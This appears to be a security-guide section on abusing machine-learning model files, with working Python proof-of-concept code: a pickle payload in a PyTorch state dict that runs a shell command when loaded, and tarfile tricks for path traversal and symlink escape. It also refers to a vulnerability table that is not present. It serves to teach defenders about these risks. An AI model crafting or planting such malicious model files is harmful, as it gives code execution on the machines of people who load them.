## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

Example:

- Create the model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Load the model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```


## Models to Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Or, with the following code you can create a model that will create a symlink to the `/tmp` directory when loaded:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```
